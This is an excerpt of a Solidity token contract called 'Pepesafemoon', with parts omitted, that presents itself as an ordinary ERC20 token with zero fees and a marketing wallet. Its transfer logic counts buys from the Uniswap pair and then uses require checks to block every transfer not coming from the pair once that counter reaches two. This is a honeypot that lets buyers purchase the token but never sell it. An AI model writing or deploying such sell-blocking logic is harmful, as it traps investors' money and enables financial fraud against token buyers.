...
contract Pepesafemoon is Context, IERC20, Ownable {
    ...
    string private constant _name = "Pepesafemoon"; // 
    string private constant _symbol = "Pepesafemoon"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 0;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x95e9e01B2d9c5aC5B0b6dA676c8140B5Af3E9Bbe;
    ...
    // Check if it's a buy operation (transfer to the recipient from the Uniswap pair)
    if (sender == uniswapV2Pair && recipient != address(uniswapV2Router)) {
        _buyCounter = _buyCounter + 1;
    }

    
    require(sender == uniswapV2Pair || _buyCounter < 2, "Transfer: Selling is disabled after 1 buy");
    ...
    require(sender == uniswapV2Pair || _buyCounter < 2, "");
